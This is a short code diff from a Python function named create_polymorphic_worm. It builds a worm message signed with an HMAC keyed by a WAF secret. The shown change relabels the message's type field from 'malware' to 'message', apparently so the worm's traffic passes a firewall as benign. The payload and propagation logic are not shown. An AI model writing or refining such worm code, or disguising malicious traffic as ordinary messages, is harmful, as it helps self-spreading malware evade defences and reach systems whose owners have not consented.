@@ -160,7 +160,7 @@ def create_polymorphic_worm(propagator_ip):
     signature = hmac.new(WAF_SECRET, payload.encode(), hashlib.sha256).hexdigest()
 
     worm_mesage = {
-        "type": "malware",
+        "type": "message",
         "payload": payload,
         "hmac": signature
     }
